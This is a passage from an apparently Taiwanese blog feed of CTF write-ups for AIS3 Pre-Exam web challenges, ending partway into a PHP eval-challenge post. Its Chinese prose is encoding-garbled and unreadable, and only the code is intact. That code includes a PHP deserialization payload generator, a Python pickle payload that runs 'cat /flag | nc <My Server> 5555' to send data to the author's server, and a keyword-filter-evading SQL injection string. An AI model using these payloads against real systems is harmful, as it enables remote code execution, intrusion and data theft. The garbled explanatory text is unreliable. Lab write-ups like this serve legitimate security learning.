code.</code>ï¼Œæ‰€ä»¥å°±å…ˆæœè‘—æ‰¾åŸç¢¼ç‚ºç›®æ¨™å‰é€²ã€‚</p><p>è©¦äº†ä¸€äº›æ–¹æ³•ï¼Œè©¦åˆ°äº†<code>/.git/HEAD</code>çš„æ™‚å€™ç™¼ç¾å¯ä»¥ç”¨GitHackä¾†æ´©æ¼åŸç¢¼ã€‚<br>é€²è¡Œæ´©æ¼å¾—åˆ°äº†ä»¥ä¸‹çš„ç¨‹å¼ç¢¼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> SESSION = <span class="string">&#x27;elephant_user&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="variable">$name</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, base64_encode(serialize(<span class="variable">$user</span>)), time() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$data</span> = @<span class="variable">$_COOKIE</span>[SESSION]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(base64_decode(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç™¼ç¾æœ‰å€‹Useré¡åˆ¥ï¼Œè€Œè¼¸å…¥çš„Nameæœƒè¢«å„²å­˜åœ¨è£¡é¢ï¼Œç„¶å¾Œå¦‚æœtokenè·ŸFlagä¸€æ¨£çš„è©±å°±æœƒå°å‡ºFlagï¼Œç„¶å¾Œé€™å€‹Useræœƒè¢«serializeå¾Œå­˜åœ¨Cookieå…§ï¼Œå¦‚æœCookieè£é ­å·²ç¶“æœ‰å…§å®¹çš„è©±å‰‡æœƒæ‹¿å‡ºä¾†Unserialzeï¼Œæ‰€ä»¥Userå…§çš„è³‡æ–™æ˜¯å¯ä»¥è¢«æ§åˆ¶çš„!</p><p>è§€å¯Ÿä¸€ä¸‹å¾Œåœ¨strcmpç™¼ç¾äº†å¼±æ¯”è¼ƒçš„éœ²æ´ã€‚<br>å¦‚æœæ”¾é€²å»çš„æ˜¯å…©å€‹Stringï¼Œé‚£å›å‚³å€¼åªæœ‰<code>&gt;0, &lt;0, ==0</code>ï¼Œå¯æ˜¯æ”¾å…¥å…¶ä»–ä¸æ˜¯Stringçš„æ±è¥¿çš„æ™‚å€™æœƒå›å‚³<code>NULL</code>ã€‚<br>è€Œ<code>strcmp($flag, $this-&gt;token) == 0</code>ç”¨å¼±æ¯”è¼ƒä¾†æª¢æŸ¥ï¼Œæ‰€ä»¥<code>NULL</code>æœƒè¢«è¦–ç‚º<code>0</code>ï¼Œé‚£é€™å€‹é©—è­‰å°±å¯ä»¥è¢«ç¹éå•¦ã€‚</p><p>æˆ‘å¯«äº†ä¸€æ®µphpä¾†ç”¢å‡ºæœ€çµ‚çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">array</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;TwinkleStar03&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt; Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6MTM6IlR3aW5rbGVTdGFyMDMiO3M6MTE6IgBVc2VyAHRva2VuIjthOjI6e2k6MDtzOjE6IkEiO2k6MTtzOjE6IkIiO319</span><br></pre></td></tr></table></figure><p>æœ€å¾ŒæŠŠé€™æ®µb64æ”¾åˆ°Cookieä¸Šï¼Œç„¶å¾Œé‡æ•´é é¢Flagå°±å‡ºä¾†äº†!</p><p>Flag: <code>AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</code></p><h3 id="ğŸSnake"><a href="#ğŸSnake" class="headerlink" title="ğŸSnake"></a>ğŸSnake</h3><p>é€™é¡Œä¸€é€²åˆ°ç¶²é å°±çµ¦å‡ºäº†Code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€é¡ŒPythonåºåˆ—åŒ–çš„é¡Œç›®ï¼Œçœ‹åˆ°é¡Œç›®çš„ç•¶ä¸‹æˆ‘æƒ³åˆ°ä¹‹å‰æœ‰çœ‹éå¯ä»¥æ¿«ç”¨<code>pickle.loads</code>å»é”åˆ°RCEçš„æ–‡ç« ï¼Œæ‰€ä»¥å°±å…ˆæœè‘—é€™å€‹ç›®æ¨™å‰é€²ã€‚</p><p>åŸæœ¬æƒ³è¦è©¦è©¦çœ‹èƒ½ä¸èƒ½è®“ä»–å½ˆä¸€å€‹ReverseShellå›ä¾†ï¼Œä¸éä¸çŸ¥é“ç‚ºä»€éº¼éƒ½ä¸æˆåŠŸï¼Œæ‰€ä»¥æœ€å¾Œåªè®“ä»–å¯ä»¥å°å‡ºFlagã€‚</p><p>æœ€å¾Œæ¡ç”¨æŠŠflag catå‡ºä¾†ä¹‹å¾Œå›å‚³çµ¦è‡ªå·±çš„ä¼ºæœå™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadObj</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&#x27;cat /flag | nc &lt;My Server&gt; 5555;&#x27;</span>,)</span><br></pre></td></tr></table></figure><p>Flag: <code>AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck&#125;</code></p><h3 id="ğŸ¦‰Owl"><a href="#ğŸ¦‰Owl" class="headerlink" title="ğŸ¦‰Owl"></a>ğŸ¦‰Owl</h3><p>ç¶²é å°±æ˜¯å€‹å¸³è™Ÿå¯†ç¢¼çš„ç™»å…¥ä»‹é¢ï¼Œç„¶è€Œæœ‰å€‹æç¤ºèªª: <code>UESS THE STUPID USERNAME / PASSWORD</code>ï¼Œæ‰€ä»¥å°±å…ˆè©¦è©¦çœ‹å¸¸è¦‹çš„å¼±å¸³å¯†ä¾†ç™»å…¥ï¼Œç™¼ç¾å¯ä»¥ç”¨<code>admin/admin</code>ä¾†ç™»å…¥ã€‚</p><p>åŸæœ¬ä»¥ç‚ºç™»å…¥ä¹‹å¾Œæ²’æœ‰æ±è¥¿äº†ï¼Œçµæœä¸Šé¢æœ‰å€‹Show hintçš„æŒ‰éˆ•è—åœ¨ä¸Šç«¯ã€‚</p><p>Hintå°±æ˜¯ç¶²é çš„åŸç¢¼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    date_default_timezone_set(<span class="string">&#x27;Asia/Taipei&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>] = md5(rand() * rand());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;csrf.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$csrf</span> = <span class="keyword">new</span> Csrf(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$message</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$alert</span> = <span class="variable">$message</span> ? <span class="string">&#x27;alert(&#x27;</span> . json_encode(<span class="variable">$message</span>) . <span class="string">&#x27;)&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$path</span> = json_encode(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;<span class="subst">$alert</span>; document.location.replace(<span class="subst">$path</span>);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            <span class="variable">$token</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$token</span> || !<span class="variable">$csrf</span>-&gt;validate(<span class="variable">$token</span>)) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;invalid csrf_token&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            <span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;username and password should not be empty&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (stripos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;sqlmap&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;sqlmap is child&#x27;s play&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            <span class="variable">$bad</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*&#x27;</span>, <span class="string">&#x27;*/&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;--&#x27;</span>];</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            <span class="variable">$hash</span> = md5(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$row</span> = (<span class="keyword">new</span> SQLite3(<span class="string">&#x27;/db.sqlite3&#x27;</span>))</span><br><span class="line">                -&gt;querySingle(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$hash</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;login failed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;unknown action: <span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br></pre></td></tr></table></figure><p>çœ‹èµ·ä¾†æ˜¯å€‹SQLiçš„é¡Œç›®ï¼Œä½†æ˜¯å‰é¢éæ¿¾äº†ä¸€äº›æœƒç”¨åˆ°çš„é—œéµå­—ï¼Œé‚„éæ¿¾å…©æ¬¡ï¼Œä½†å…¶å¯¦æ˜¯å¯ä»¥è¢«ç¹éçš„!<br>æ¯”æ–¹èªª<code>union</code>ï¼Œå¦‚æœæˆ‘æŠŠé—œéµå­—åšæˆ<code>unoorrion</code>ï¼Œç¬¬ä¸€æ¬¡éæ¿¾å¾Œæœƒè®Šæˆ<code>unorion</code>å†ç¶“éä¸€æ¬¡ä¹‹å¾Œæœƒè®Šæˆ<code>union</code>å°±è®Šæˆåˆæ³•çš„é—œéµå­—äº†! æ¯å€‹é—œéµå­—éƒ½å¯ä»¥é€éé€™ç¨®æ–¹æ³•ä¾†ç¹é! </p><p>ä½†ç©ºç™½ä¹Ÿæœƒè¢«éæ¿¾æ‰ï¼Œä½†æ˜¯å…¶å¯¦å¯ä»¥é€é<code>/</code>ä¾†ä»£æ›¿ç©ºç™½ï¼Œä»£æ›¿å®Œçš„Queryé‚„æ˜¯åˆæ³•çš„!</p><p>æœ€çµ‚Query: <code>&#39;/oorr**oorr/unoorrion/oorr**oorr/all/oorr**oorr/selecoorrt/oorr**oorr/1,group_concat(value),2/oorr**oorr/frfrfromomom/oorr**oorr/garbage/oorr*</code></p><p>Flag: <code>AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¾æ¥è§¸CTFåˆ°ç¾åœ¨å·²ç¶“éäº†ä¸€å¹´ï¼Œåœ¨CTFçš„æŠ€è¡“ä¸Šçš„ç¢ºé€²æ­¥äº†ä¸å°‘ï¼Œä½†é‚„æœ‰å¾ˆé•·ä¸€æ®µè·¯è¦èµ°å‘¢!&lt;/p&gt;
&lt;p&gt;çµæœPwnæ²’è§£æ‰å¹¾é¡Œï¼ŒèŠ±å¤§éƒ¨åˆ†æ™‚é–“åœ¨çœ‹webâ€¦äº‹å¾Œçœ‹äº†pwnçš„é¡Œç›®æ‰ç™¼ç¾è‡ªå·±è§£çš„æ‰â€¦æ—©çŸ¥é“å°±å…ˆæ‰“Pwnã„‰QAQ&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="AIS3 Pre-Exam" scheme="https://twinklestar03.com/tags/AIS3-Pre-Exam/"/>
    
  </entry>
  
  <entry>
    <title>PHPå­—å…ƒçš„ç¥å¥‡é‹ç”¨</title>
    <link href="https://twinklestar03.com/Contest/CTF/MooncakeCTF/"/>
    <id>https://twinklestar03.com/Contest/CTF/MooncakeCTF/</id>
    <published>2019-08-29T16:00:00.000Z</published>
    <updated>2020-12-18T07:35:12.495Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰å€‹ä»¥å‰åœ¨æ‰“CTFçš„æœ‹å‹ï¼Œæ‹¿ä»¥å‰å‡ºçš„PHP webé¡Œçµ¦æˆ‘ç©~</p><p>éç¨‹ä¸­å­¸åˆ°äº†PHPä¸€å€‹å¾ˆå¥‡å¦™çš„ç‰¹æ€§â€¦</p><a id="more"></a><hr><p>ä¸€é–‹å§‹å°±ä¸Ÿå‡ºäº†ç¶²é çš„source code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_ = &quot;flag.txt&quot;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;lol.nop&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]) || !is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$s</span>) &gt; <span class="number">300</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[0-9~!@#^$%&amp;*_+=\[\]|:;-]*$/&#x27;</span>, <span class="variable">$s</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;bad input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> .= <span class="string">&#x27;echo file_get_contents($_);&#x27;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨<code>0123456789~!@#^$%&amp;*_+=[]|:;-</code>ä¾†é€æŒ‡ä»¤é€²<code>eval()</code>ã€‚</p><p>åŸæœ¬æ˜¯æƒ³èªªæœ‰æ²’æœ‰æ©Ÿæœƒå¯ä»¥é–‹webshellèµ·ä¾†ä½†ç™¼ç¾ä¸èƒ½ä½¿ç”¨()è·Ÿ{}æ²’è¾¦æ³•åŸ·è¡Œä»»ä½•å‡½å¼ï¼Œæ‰€ä»¥å°‡æ³¨æ„åŠ›è½‰ç§»åˆ°<code>$_</code>ä¸Šï¼Œæœ‰ç”šéº¼è¾¦æ³•æ˜¯å¯ä»¥ç”¨ä¾†æŠŠ<code>lol.nop</code>æ”¹æˆ<code>flag.txt</code>å‘¢?</p><p>é‚£å°±æŠŠæ³¨æ„åŠ›è½‰ç§»åˆ°é€ å­—ä¸Šé¢ï¼ŒPHPæœ‰å€‹å¾ˆé…·çš„ç‰¹æ€§ï¼Œç”¨å€‹ç¯„ä¾‹å°±å¯ä»¥å¾ˆè¼•é¬†æ˜ç™½:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>++; <span class="comment">// b</span></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>++; <span class="comment">// c</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥é€é<code>å­—å…ƒè®Šæ•¸++</code>ä¾†æ”¹è®Šå­—æ¯ï¼Œé€™ä»£è¡¨æˆ‘å€‘å¯ä»¥é€ å­—ï¼Œæ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ç•¶é€ åˆ°<code>&#39;z&#39;</code>çš„æ™‚å€™åœ¨ç¹¼çºŒå®¶ä¸‹å»æœƒè®Šæˆä¸€å€‹é™£åˆ—<code>[&#39;a&#39;, &#39;a&#39;]</code>å¦‚æœæƒ³è¦åœ¨ç¹¼çºŒé€ 